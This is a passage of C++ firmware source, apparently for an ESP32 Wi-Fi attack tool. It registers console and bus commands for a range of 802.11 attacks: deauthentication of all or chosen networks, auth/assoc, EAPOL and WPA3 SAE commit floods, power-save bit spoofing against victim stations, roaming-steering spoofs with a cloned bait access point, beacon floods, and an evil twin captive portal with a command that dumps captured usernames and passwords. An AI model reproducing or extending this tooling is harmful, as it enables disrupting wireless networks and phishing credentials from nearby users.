  wb_reply_printf(reply, "OK RRM %d nbr count=%u token=%u cand=%s ch=%u info=0x%08X ssid=%s\n", index,
                  (unsigned)count, (unsigned)token, cand_text, (unsigned)ch, (unsigned)info,
                  WiFi.SSID(index).c_str());
  console_ui_log("rrm started");
  wbus_emit("rrm.state", "active=1");
  return WB_OK;
}

wb_err_t rrm_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = rrm_frames();
  const uint32_t clients = rrm_clients();
  rrm_stop();
  wb_reply_printf(reply, "OK RRMSTOP frames=%u clients=%u\n", (unsigned)frames,
                  (unsigned)clients);
  console_ui_log("rrm stopped");
  wbus_emit("rrm.state", "active=0");
  return WB_OK;
}

wb_err_t rrm_bus_test(const wb_args_t*, wb_reply_t*) {
  rrm_selftest();
  return WB_OK;
}

const wb_method_t kRrmMethods[] = {
    {.name = "start", .args = kRrmStartArgs, .n_args = 10, .handler = rrm_bus_start,
     .summary = "802.11k Neighbor Report Response spoof"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = rrm_bus_stop,
     .summary = "stop the Neighbor Report spoof"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = rrm_bus_test,
     .summary = "dump the Neighbor Report Response bytes"},
};

// ---- Bait AP (BTM / RRM steering target) ------------------------------------

const wb_arg_spec_t kBaitapStartArgs[] = {
    // Positional order matches the console line BAITAP <idx> [pass] [ch] [max];
    // ssid sits last because it is only reachable through CALL (named form).
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index to clone (SSID and channel come from it)", .err = nullptr, .def = -1,
     .min = 0, .max = 0},
    {.name = "pass", .type = WB_T_STR, .flags = 0, .enums = nullptr,
     .label = "passphrase of the target BSS; omit for an open one", .err = nullptr, .def = 0,
     .min = 0, .max = 0},
    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "channel, 0 = same as the cloned AP", .err = nullptr, .def = 0, .min = 0,
     .max = 0},
    {.name = "max", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "max associated stations, 1..4 (2 keeps the heap cost low)", .err = nullptr,
     .def = 2, .min = 0, .max = 0},
    {.name = "ssid", .type = WB_T_STR, .flags = 0, .enums = nullptr,
     .label = "SSID for the named form (CALL baitap.start ssid=...), overrides idx",
     .err = nullptr, .def = 0, .min = 0, .max = 0},
};

wb_err_t baitap_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  const wb_value_t* ssid_arg = wb_arg(args, "ssid");
  const bool have_ssid = ssid_arg != nullptr && ssid_arg->text != nullptr && ssid_arg->text[0] != 0;
  if (index < 0 && !have_ssid) {
    wb_reply_line(reply, "ERR BAITAP needs idx=<scan index> or ssid=<text>");
    return WB_ERR_ARG;
  }
  if (index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }

  // Copy before use: WiFi.SSID() returns a temporary String, and the OK line is
  // printed after that temporary would already be gone.
  char ssid_buf[33];
  snprintf(ssid_buf, sizeof(ssid_buf), "%s",
           have_ssid ? ssid_arg->text : WiFi.SSID(index).c_str());
  const char* ssid = ssid_buf;
  long channel = wb_arg_num(args, "ch");
  if (channel == 0) {
    channel = WiFi.channel(index);
  }
  if (channel < 1 || channel > 13) {
    wb_reply_line(reply, "ERR channel must be 1..13");
    return WB_ERR_ARG;
  }
  const wb_value_t* pass_arg = wb_arg(args, "pass");
  const char* pass = (pass_arg != nullptr && pass_arg->text != nullptr) ? pass_arg->text : nullptr;
  const long max_conn = wb_arg_num(args, "max");

  if (!baitap_start(ssid, pass, (uint8_t)channel, (uint8_t)max_conn)) {
    return WB_ERR_STATE;
  }
  uint8_t bssid[6];
  baitap_bssid(bssid);
  char bssid_text[18];
  mac_text(bssid, bssid_text);
  wb_reply_printf(reply, "OK BAITAP ssid=%s bssid=%s ch=%ld auth=%s clients=%u heap=%d\n", ssid,
                  bssid_text, channel, (pass == nullptr || pass[0] == 0) ? "OPEN" : "WPA2",
                  (unsigned)baitap_clients(), (int)baitap_heap_cost());
  console_ui_log("bait ap up");
  wbus_emit("baitap.state", "active=1");
  return WB_OK;
}

wb_err_t baitap_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t joins = baitap_joins();
  const uint32_t leaves = baitap_leaves();
  baitap_stop();
  wb_reply_printf(reply, "OK BAITAPSTOP joins=%u leaves=%u heap=%u\n", (unsigned)joins,
                  (unsigned)leaves, (unsigned)esp_get_free_heap_size());
  console_ui_log("bait ap down");
  wbus_emit("baitap.state", "active=0");
  return WB_OK;
}

wb_err_t baitap_bus_status(const wb_args_t*, wb_reply_t* reply) {
  uint8_t bssid[6];
  baitap_bssid(bssid);
  char bssid_text[18];
  mac_text(bssid, bssid_text);
  wb_reply_printf(reply,
                  "BAITAP state=%s ssid=%s bssid=%s ch=%u clients=%u joins=%u leaves=%u "
                  "heap_cost=%d\n",
                  baitap_running() ? "up" : "off", baitap_running() ? baitap_ssid() : "-",
                  bssid_text, (unsigned)baitap_channel(), (unsigned)baitap_clients(),
                  (unsigned)baitap_joins(), (unsigned)baitap_leaves(),
                  (int)baitap_heap_cost());
  return WB_OK;
}

const wb_method_t kBaitapMethods[] = {
    {.name = "start", .args = kBaitapStartArgs, .n_args = 5, .handler = baitap_bus_start,
     .summary = "clone a BSS so BTM/RRM have somewhere to steer the station"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = baitap_bus_stop,
     .summary = "tear the bait AP down"},
    {.name = "status", .args = nullptr, .n_args = 0, .handler = baitap_bus_status,
     .summary = "bait AP state and heap cost"},
};

// ---- EAPOL-Start / Logoff flood ---------------------------------------------

const wb_arg_spec_t kEapolStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "tid", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "QoS TID -1..7 (-1 = plain data frames only)", .err = nullptr, .def = 6, .min = 0,
     .max = 0},
    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "forged station MAC (optional)", .err = "station MAC must look like AABBCCDDEEFF",
     .def = 0, .min = 0, .max = 0},
};

wb_err_t eapol_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const long tid = wb_arg_num(args, "tid");
  if (tid < -1 || tid > 7) {
    wb_reply_line(reply, "ERR tid must be -1 (plain data only) or 0..7");
    return WB_ERR_ARG;
  }
  uint8_t sta[6];
  const bool have_sta = wb_arg_mac(args, "sta", sta);
  attack_stop();
  if (!eapol_start(index, (int8_t)tid)) {
    wb_reply_line(reply, "ERR cannot start the EAPOL flood on that network");
    return WB_ERR_STATE;
  }
  if (have_sta) eapol_add_station(sta);
  wb_reply_printf(reply, "OK EAPOL %d tid=%ld ch=%u ssid=%s\n", index, tid,
                  (unsigned)WiFi.channel(index), WiFi.SSID(index).c_str());
  console_ui_log("eapol flood started");
  wbus_emit("eapol.state", "active=1");
  return WB_OK;
}

wb_err_t eapol_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = eapol_frames();
  const uint32_t rx = eapol_rx_from_ap();
  const uint32_t rxsta = eapol_rx_from_sta();
  eapol_stop();
  wb_reply_printf(reply, "OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
                  (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
  console_ui_log("eapol stopped");
  wbus_emit("eapol.state", "active=0");
  return WB_OK;
}

wb_err_t eapol_bus_test(const wb_args_t*, wb_reply_t*) {
  eapol_selftest();
  return WB_OK;
}

const wb_method_t kEapolMethods[] = {
    {.name = "start", .args = kEapolStartArgs, .n_args = 3, .handler = eapol_bus_start,
     .summary = "EAPOL-Start/Logoff flood as a forged station"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = eapol_bus_stop, .summary = "stop the EAPOL flood"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = eapol_bus_test, .summary = "dump the EAPOL data frames"},
};

// ---- QoS Null PM-bit spoof --------------------------------------------------

const wb_arg_spec_t kQosnullStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "sta", .type = WB_T_MAC, .flags = 0, .enums = nullptr,
     .label = "victim MAC (empty = learn it from the sniffer)", .err = nullptr, .def = 0,
     .min = 0, .max = 0},
};

wb_err_t qosnull_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  uint8_t sta[6];
  bool have_sta = false;
  const wb_value_t* sta_arg = wb_arg(args, "sta");
  if (sta_arg != nullptr && sta_arg->present && sta_arg->text != nullptr &&
      sta_arg->text[0] != 0) {
    if (!wb_parse_mac(sta_arg->text, sta)) {
      wb_reply_printf(reply, "ERR sta must be aa:bb:cc:dd:ee:ff, got '%s'\n", sta_arg->text);
      return WB_ERR_ARG;
    }
    have_sta = true;
  }
  attack_stop();
  if (!qosnull_start(index, have_sta ? sta : nullptr)) {
    wb_reply_line(reply, "ERR cannot start the PM-bit spoof on that network");
    return WB_ERR_STATE;
  }
  char sta_out[18];
  sta_out[0] = 0;
  if (have_sta) {
    mac_text(sta, sta_out);
  }
  const int32_t chan_err = qosnull_channel_err();
  wb_reply_printf(reply, "OK QOSNULL %d mode=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
                  qosnull_mode_name(), sta_out[0] ? sta_out : "learned",
                  (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
  if (chan_err != 0) {
    wb_reply_printf(reply,
                    "WARN chset=%d: the channel change was refused (a scan still running?),"
                    " frames go out on the current channel\n",
                    (int)chan_err);
  }
  console_ui_log("qos null pm spoof started");
  wbus_emit("qosnull.state", "active=1");
  return WB_OK;
}

wb_err_t qosnull_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = qosnull_frames();
  const uint32_t pm1 = qosnull_pm1_frames();
  const uint32_t pm0 = qosnull_pm0_frames();
  const uint32_t dl = qosnull_dl_frames();
  qosnull_stop();
  wb_reply_printf(reply, "OK QOSNULLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
                  (unsigned)pm1, (unsigned)pm0, (unsigned)dl);
  console_ui_log("qos null pm spoof stopped");
  wbus_emit("qosnull.state", "active=0");
  return WB_OK;
}

wb_err_t qosnull_bus_release(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t clients = qosnull_clients();
  const uint32_t before = qosnull_pm0_frames();
  qosnull_release();
  wb_reply_printf(reply, "OK QOSNULLREL clients=%u flushed=%u\n", (unsigned)clients,
                  (unsigned)(qosnull_pm0_frames() - before));
  console_ui_log("pm=0 release sent");
  wbus_emit("qosnull.state", "active=0");
  return WB_OK;
}

wb_err_t qosnull_bus_test(const wb_args_t*, wb_reply_t*) {
  qosnull_selftest();
  return WB_OK;
}

const wb_method_t kQosnullMethods[] = {
    {.name = "start", .args = kQosnullStartArgs, .n_args = 2, .handler = qosnull_bus_start,
     .summary = "forge a unicast QoS Null as a victim and flip the PM bit"},
    {.name = "release", .args = nullptr, .n_args = 0, .handler = qosnull_bus_release,
     .summary = "send PM=0 to every victim, then stop"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = qosnull_bus_stop,
     .summary = "stop the PM-bit spoof without a release"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = qosnull_bus_test,
     .summary = "dump the QoS Null bytes (PM=1 / PM=0)"},
};

// ---- SAE commit flood -------------------------------------------------------

const wb_arg_spec_t kSaeStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "elem", .type = WB_T_ENUM, .flags = 0, .enums = "point|rand",
     .label = "point = real P-256 generator, rand = garbage control",
     .err = "element must be 'point' (P-256 generator) or 'rand'", .def = 0, .min = 0, .max = 0},
    {.name = "gap", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "gap between commits in ms (0..1000)", .err = nullptr, .def = 0, .min = 0, .max = 0},
};

wb_err_t sae_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const wb_value_t* elem = wb_arg(args, "elem");
  const sae_element_t element =
      (elem != nullptr && elem->text != nullptr && strcmp(elem->text, "rand") == 0)
          ? SAE_ELEM_RANDOM
          : SAE_ELEM_BASEPOINT;
  const long gap = wb_arg_num(args, "gap");
  if (gap < 0 || gap > 1000) {
    wb_reply_line(reply, "ERR gap_ms must be 0..1000");
    return WB_ERR_ARG;
  }
  attack_stop();
  if (!sae_start(index, element, (uint32_t)gap)) {
    wb_reply_line(reply, "ERR cannot start the SAE flood on that network");
    return WB_ERR_STATE;
  }
  if (gap > 0 && gap < 50) {
    // The pool drains at ~32 frames/s; faster than 20 frames/s fills it in a couple
    // of seconds and the chip restarts (0x101 rule).
    wb_reply_printf(reply, "INFO SAE gap_ms=%ld raised to %u (unicast pool drains at ~32 frames/s)\n",
                    gap, (unsigned)sae_gap_ms());
  }
  wb_reply_printf(reply, "OK SAE %d elem=%s gap_ms=%u ch=%u\n", index,
                  element == SAE_ELEM_BASEPOINT ? "point" : "rand", (unsigned)sae_gap_ms(),
                  (unsigned)WiFi.channel(index));
  console_ui_log("sae flood started");
  wbus_emit("sae.state", "active=1");
  return WB_OK;
}

wb_err_t sae_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = sae_frames();
  const uint32_t resp = sae_responses();
  const uint32_t tokens = sae_tokens();
  sae_stop();
  wb_reply_printf(reply, "OK SAESTOP frames=%u identities=%u responses=%u tokens=%u echoed=%u\n",
                  (unsigned)frames, (unsigned)sae_identities(), (unsigned)resp, (unsigned)tokens,
                  (unsigned)sae_echoed());
  console_ui_log("sae stopped");
  wbus_emit("sae.state", "active=0");
  return WB_OK;
}

wb_err_t sae_bus_test(const wb_args_t*, wb_reply_t*) {
  sae_selftest();
  return WB_OK;
}

const wb_method_t kSaeMethods[] = {
    {.name = "start", .args = kSaeStartArgs, .n_args = 3, .handler = sae_bus_start,
     .summary = "SAE Commit flood (WPA3), echoes anti-clogging tokens"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = sae_bus_stop, .summary = "stop the SAE flood"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = sae_bus_test, .summary = "dump the SAE Commit bytes"},
};

// ---- auth / assoc flood -----------------------------------------------------

const wb_arg_spec_t kAuthfloodStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
    {.name = "mode", .type = WB_T_ENUM, .flags = 0, .enums = "both|auth|assoc",
     .label = "which frames to flood", .err = "mode must be both|auth|assoc", .def = 0, .min = 0,
     .max = 0},
    {.name = "noauto", .type = WB_T_ENUM, .flags = 0, .enums = "noauto",
     .label = "pass 'noauto' to keep a WPA3 AP on auth/assoc only",
     .err = "noauto accepts only the literal 'noauto'", .def = 0, .min = 0, .max = 0},
};

wb_err_t authflood_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    return WB_ERR_ARG;
  }
  const wb_value_t* mode_arg = wb_arg(args, "mode");
  authflood_mode_t mode = AUTHFLOOD_BOTH;
  if (mode_arg != nullptr && mode_arg->text != nullptr) {
    if (strcmp(mode_arg->text, "auth") == 0) mode = AUTHFLOOD_AUTH_ONLY;
    else if (strcmp(mode_arg->text, "assoc") == 0) mode = AUTHFLOOD_ASSOC_ONLY;
  }
  const wb_value_t* noauto = wb_arg(args, "noauto");
  const bool auto_upgrade = !(noauto != nullptr && noauto->present);
  attack_stop();
  if (!authflood_start(index, mode, auto_upgrade)) {
    wb_reply_line(reply, "ERR cannot start the auth flood on that network");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK AUTHFLOOD %d mode=%s auto=%d ch=%u ssid=%s\n", index,
                  authflood_mode_name(), auto_upgrade ? 1 : 0, (unsigned)WiFi.channel(index),
                  WiFi.SSID(index).c_str());
  console_ui_log("auth flood started");
  wbus_emit("authflood.state", "active=1");
  return WB_OK;
}

wb_err_t authflood_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  const uint32_t frames = authflood_frames();
  const uint32_t status = authflood_last_status();
  const bool upgraded = authflood_upgraded();
  authflood_stop();
  wb_reply_printf(reply, "OK AUTHFLOODSTOP frames=%u identities=%u last_status=%u upgraded=%d\n",
                  (unsigned)frames, (unsigned)authflood_identities(), (unsigned)status,
                  upgraded ? 1 : 0);
  console_ui_log("auth flood stopped");
  wbus_emit("authflood.state", "active=0");
  return WB_OK;
}

wb_err_t authflood_bus_test(const wb_args_t*, wb_reply_t*) {
  authflood_selftest();
  return WB_OK;
}

const wb_method_t kAuthfloodMethods[] = {
    {.name = "start", .args = kAuthfloodStartArgs, .n_args = 3, .handler = authflood_bus_start,
     .summary = "auth/assoc flood, upgrades to SAE on a WPA3 AP"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = authflood_bus_stop,
     .summary = "stop the auth/assoc flood"},
    {.name = "test", .args = nullptr, .n_args = 0, .handler = authflood_bus_test,
     .summary = "dump the forged auth/assoc bytes"},
};

// ---- deauth extras: all / only / except -------------------------------------

const wb_arg_spec_t kDeauthAllArgs[] = {
    {.name = "reason", .type = WB_T_REASON, .flags = 0, .enums = nullptr,
     .label = "deauth reason: 1..65535, or random",
     .err = "reason must be 1..65535, or 'random'", .def = 1, .min = 0, .max = 0},
};

wb_err_t deauth_bus_all(const wb_args_t* args, wb_reply_t* reply) {
  uint16_t reason = 1;
  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
  if (console_scan_count() == 0) {
    wb_reply_line(reply, "ERR no AP list, run SCAN first");
    return WB_ERR_ARG;
  }
  if (!attack_deauth_all(reason)) {
    wb_reply_line(reply, "ERR cannot start deauth-all");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK DEAUTH_ALL aps=%d\n", attack_ap_count());
  console_ui_log("deauth all started");
  wbus_emit("deauth.state", "active=1");
  return WB_OK;
}

const wb_arg_spec_t kDeauthListArgs[] = {
    {.name = "list", .type = WB_T_STR, .flags = 0, .enums = nullptr,
     .label = "comma separated scan indexes, e.g. 1,3,5", .err = nullptr, .def = 0, .min = 0,
     .max = 0},
    {.name = "reason", .type = WB_T_REASON, .flags = 0, .enums = nullptr,
     .label = "deauth reason: 1..65535, or random",
     .err = "reason must be 1..65535, or 'random'", .def = 1, .min = 0, .max = 0},
};

wb_err_t deauth_bus_list(const wb_args_t* args, wb_reply_t* reply, bool except) {
  const wb_value_t* list = wb_arg(args, "list");
  int indexes[MAX_AP_TARGETS];
  const int count = console_parse_index_list(list != nullptr ? const_cast<char*>(list->text) : nullptr,
                                             indexes, MAX_AP_TARGETS);
  if (count == 0) {
    wb_reply_line(reply, "ERR need an index list, e.g. DEAUTH_ONLY 1,3,5");
    return WB_ERR_ARG;
  }
  uint16_t reason = 1;
  // The legacy order applied the reason before the list/scan checks; keep it so an
  // out-of-set reason still prints its INFO line first.
  if (!console_apply_reason(wb_arg(args, "reason"), &reason)) return WB_ERR_ARG;
  if (console_scan_count() == 0) {
    wb_reply_line(reply, "ERR no AP list, run SCAN first");
    return WB_ERR_ARG;
  }
  const bool ok = except ? attack_deauth_except(indexes, count, reason)
                         : attack_deauth_only(indexes, count, reason);
  if (!ok) {
    wb_reply_line(reply, "ERR cannot start that deauth set");
    return WB_ERR_STATE;
  }
  wb_reply_printf(reply, "OK %s %d aps\n", except ? "DEAUTH_EXCEPT" : "DEAUTH_ONLY",
                  attack_ap_count());
  console_ui_log(except ? "deauth except started" : "deauth only started");
  wbus_emit("deauth.state", "active=1");
  return WB_OK;
}

wb_err_t deauth_bus_only(const wb_args_t* args, wb_reply_t* reply) {
  return deauth_bus_list(args, reply, false);
}

wb_err_t deauth_bus_except(const wb_args_t* args, wb_reply_t* reply) {
  return deauth_bus_list(args, reply, true);
}

// ---- probe broadcast --------------------------------------------------------

wb_err_t probe_bus_broadcast(const wb_args_t*, wb_reply_t* reply) {
  if (!attack_probe_broadcast()) {
    wb_reply_line(reply, "ERR cannot start probe broadcast");
    return WB_ERR_STATE;
  }
  wb_reply_line(reply, "OK PROBE_BROADCAST");
  console_ui_log("probe broadcast started");
  wbus_emit("probe.state", "active=1");
  return WB_OK;
}

const wb_method_t kProbeMethods[] = {
    {.name = "broadcast", .args = nullptr, .n_args = 0, .handler = probe_bus_broadcast,
     .summary = "flood fake APs (beacon + probe response)"},
};

// ---- evil twin --------------------------------------------------------------

const wb_arg_spec_t kEvilStartArgs[] = {
    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
     .label = "scan index (run SCAN first)", .err = nullptr, .def = -1, .min = 0, .max = 0},
};

wb_err_t evil_bus_start(const wb_args_t* args, wb_reply_t* reply) {
  const int index = (int)wb_arg_num(args, "idx");
  if (index < 0 || index >= console_scan_count()) {
    wb_reply_line(reply, "ERR index out of range, run SCAN first");
    console_ui_log("evil twin: index out of range");
    return WB_ERR_ARG;
  }
  wb_reply_printf(reply, "OK EVILTWIN %d %s\n", index, WiFi.SSID(index).c_str());
  console_ui_log("evil twin starting");
  start_evil_twin_attack(index);
  wbus_emit("evil.state", "active=1");
  return WB_OK;
}

wb_err_t evil_bus_stop(const wb_args_t*, wb_reply_t* reply) {
  stop_evil_twin();
  wb_reply_line(reply, "OK EVILTWIN_STOP");
  console_ui_log("evil twin stopped");
  wbus_emit("evil.state", "active=0");
  return WB_OK;
}

wb_err_t evil_bus_creds(const wb_args_t*, wb_reply_t* reply) {
  wb_reply_line(reply, "CREDS_BEGIN");
  for (int i = 0; i < captured_count; i++) {
    wb_reply_printf(reply, "CRED %d %s %s %lu\n", i, captured_creds[i].username,
                    captured_creds[i].password, captured_creds[i].timestamp);
  }
  wb_reply_printf(reply, "CREDS_END %d\n", captured_count);
  return WB_OK;
}

const wb_method_t kEvilMethods[] = {
    {.name = "start", .args = kEvilStartArgs, .n_args = 1, .handler = evil_bus_start,
     .summary = "clone the AP and open a captive portal"},
    {.name = "stop", .args = nullptr, .n_args = 0, .handler = evil_bus_stop, .summary = "stop the evil twin"},
    {.name = "creds", .args = nullptr, .n_args = 0, .handler = evil_bus_creds, .summary = "dump captured credentials (RAM)"},
};

// ---- radio ------------------------------------------------------------------

wb_err_t radio_bus_status(const wb_args_t*, wb_reply_t* reply) {
  bool promisc = false;
  wifi_promiscuous_filter_t type_filter = {0};
  wifi_promiscuous_filter_t ctrl_filter = {0};
  uint8_t prim = 0;
  wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
  const esp_err_t e1 = esp_wifi_get_promiscuous(&promisc);
  const esp_err_t e2 = esp_wifi_get_promiscuous_filter(&type_filter);
  const esp_err_t e3 = esp_wifi_get_promiscuous_ctrl_filter(&ctrl_filter);
  esp_wifi_get_channel(&prim, &sec);
  wb_reply_printf(reply,
                  "RADIO promisc=%u(%d) filter=0x%08X(%d) ctrl_filter=0x%08X(%d) ch=%u owner=%s rtake=%u\n",
                  (unsigned)(promisc ? 1 : 0), (int)e1, (unsigned)type_filter.filter_mask,
                  (int)e2, (unsigned)ctrl_filter.filter_mask, (int)e3, (unsigned)prim,
                  radio_owner()[0] != 0 ? radio_owner() : "none",
                  (unsigned)radio_takeovers());
  return WB_OK;
}

const wb_method_t kRadioMethods[] = {
    {.name = "status", .args = nullptr, .n_args = 0, .handler = radio_bus_status,
     .summary = "sniffer state, channel and channel-arbiter owner"},
};

const wb_object_t kObjects[] = {
    {.name = "deauth",
     .title = "Deauth / disassoc flood",
     .methods = kDeauthMethods,
     .n_methods = (int)(sizeof(kDeauthMethods) / sizeof(kDeauthMethods[0])),
     .events = "state"},
    {.name = "csa",
     .title = "CSA spoof",
     .methods = kCsaMethods,
     .n_methods = (int)(sizeof(kCsaMethods) / sizeof(kCsaMethods[0])),
     .events = "state"},
    {.name = "delba",
     .title = "DELBA spoof",
     .methods = kDelbaMethods,
     .n_methods = (int)(sizeof(kDelbaMethods) / sizeof(kDelbaMethods[0])),
     .events = "state"},
    {.name = "ba",
     .title = "BA session hijack",
     .methods = kBaMethods,
     .n_methods = (int)(sizeof(kBaMethods) / sizeof(kBaMethods[0])),
     .events = "state"},
    {.name = "baitap",
     .title = "Bait AP: cloned BSS for BTM/RRM steering",
     .methods = kBaitapMethods,
     .n_methods = (int)(sizeof(kBaitapMethods) / sizeof(kBaitapMethods[0])),
     .events = "state"},
    {.name = "btm",
     .title = "802.11v BTM Request spoof",
     .methods = kBtmMethods,
     .n_methods = (int)(sizeof(kBtmMethods) / sizeof(kBtmMethods[0])),
     .events = "state"},
    {.name = "rrm",
     .title = "802.11k Neighbor Report spoof",
     .methods = kRrmMethods,
     .n_methods = (int)(sizeof(kRrmMethods) / sizeof(kRrmMethods[0])),
     .events = "state"},
    {.name = "bsrp",
     .title = "HE BSRP Trigger poll (frame-level)",
     .methods = kBsrpMethods,
     .n_methods = (int)(sizeof(kBsrpMethods) / sizeof(kBsrpMethods[0])),
     .events = "state"},
    {.name = "eapol",
     .title = "EAPOL-Start/Logoff flood",
     .methods = kEapolMethods,
     .n_methods = (int)(sizeof(kEapolMethods) / sizeof(kEapolMethods[0])),
     .events = "state"},
    {.name = "qosnull",
     .title = "QoS Null PM-bit spoof",
     .methods = kQosnullMethods,
     .n_methods = (int)(sizeof(kQosnullMethods) / sizeof(kQosnullMethods[0])),
     .events = "state"},
    {.name = "sae",
     .title = "SAE Commit flood",
     .methods = kSaeMethods,
     .n_methods = (int)(sizeof(kSaeMethods) / sizeof(kSaeMethods[0])),
     .events = "state"},
    {.name = "authflood",
     .title = "Auth / assoc flood",
     .methods = kAuthfloodMethods,
     .n_methods = (int)(sizeof(kAuthfloodMethods) / sizeof(kAuthfloodMethods[0])),
     .events = "state"},
    {.name = "probe",
     .title = "Probe / beacon flood",
     .methods = kProbeMethods,
     .n_methods = (int)(sizeof(kProbeMethods) / sizeof(kProbeMethods[0])),
     .events = "state"},
    {.name = "evil",
     .title = "Evil twin + captive portal",
     .methods = kEvilMethods,
     .n_methods = (int)(sizeof(kEvilMethods) / sizeof(kEvilMethods[0])),
     .events = "state"},
    {.name = "radio",
     .title = "Radio / sniffer / channel arbiter",
     .methods = kRadioMethods,
     .n_methods = (int)(sizeof(kRadioMethods) / sizeof(kRadioMethods[0])),
     .events = ""},
};

}  // namespace

void wbus_register_all(void) {
  for (const wb_object_t& obj : kObjects) {
    wbus_register(&obj);
  }
}
